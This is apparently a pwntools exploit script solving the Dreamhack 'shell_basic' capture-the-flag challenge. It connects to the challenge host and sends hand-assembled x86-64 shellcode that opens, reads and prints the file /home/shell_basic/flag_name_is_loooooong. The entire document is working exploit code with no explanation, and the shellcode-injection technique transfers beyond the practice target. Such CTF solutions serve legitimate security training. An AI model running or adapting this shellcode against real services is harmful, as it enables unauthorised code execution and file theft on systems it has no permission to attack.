from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/shell_basic/shell_basic')

context.arch = 'amd64'
cyberedu = 'host3.dreamhack.games:21826'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
p.recvuntil(b": ")

#string of file is /home/shell_basic/flag_name_is_loooooong
print(len("/home/shell_basic/flag_name_is_loooooong"))

shellcode_open = asm('''
push 0x0
mov rax, 0x676e6f6f6f6f6f6f
push rax
mov rax, 0x6c5f73695f656d61
push rax
mov rax, 0x6e5f67616c662f63
push rax
mov rax, 0x697361625f6c6c65
push rax
mov rax, 0x68732f656d6f682f
push rax

mov rdi, rsp
xor rsi, rsi
xor rdx, rdx

mov rax, 2
syscall
''')

shellcode_read = asm('''
mov rdi, rax
sub rsp, 0x30
mov rsi, rsp
mov rdx, 0x30

mov rax, 0
syscall
''')

#rsi alrdy rsp, rdx alrdy 0x30
shellcode_write = asm('''
mov rdi, 1

mov rax, 1
syscall
''')

p.send(shellcode_open + shellcode_read + shellcode_write)

p.interactive()
